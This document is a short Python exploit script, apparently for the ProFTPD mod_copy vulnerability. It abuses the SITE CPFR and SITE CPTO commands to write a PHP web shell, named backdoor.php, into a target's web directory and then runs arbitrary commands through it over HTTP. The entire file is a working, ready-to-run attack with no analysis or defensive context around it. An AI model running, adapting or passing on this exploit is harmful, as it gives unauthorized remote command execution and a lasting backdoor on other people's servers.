import re
import socket
import requests
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('--host', required=True)
parser.add_argument('--ftpport', required=True, type=int)
parser.add_argument('--path', required=True)
parser.add_argument('--command', required=True)
args = parser.parse_args()

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((args.host, args.ftpport))
sock.recv(1024)

payload = "<?php echo passthru($_GET['cmd']); ?>"
sock.send(b"site cpfr /proc/self/cmdline\n")
sock.recv(1024)
sock.send(("site cpto /tmp/." + payload + "\n").encode("utf-8"))
sock.recv(1024)
sock.send(("site cpfr /tmp/." + payload + "\n").encode("utf-8"))
sock.recv(1024)
sock.send(("site cpto "+ args.path +"/backdoor.php\n").encode("utf-8"))

if "Copy successful" in str(sock.recv(1024)):
    data = requests.get(f"http://{args.host}/backdoor.php?cmd={args.command}")
    match = re.search('cpto /tmp/.([^"]+)', data.text)
    print(match.group(0)[11::].replace("\n", ""))
else:
    raise Exception("Something went wrong")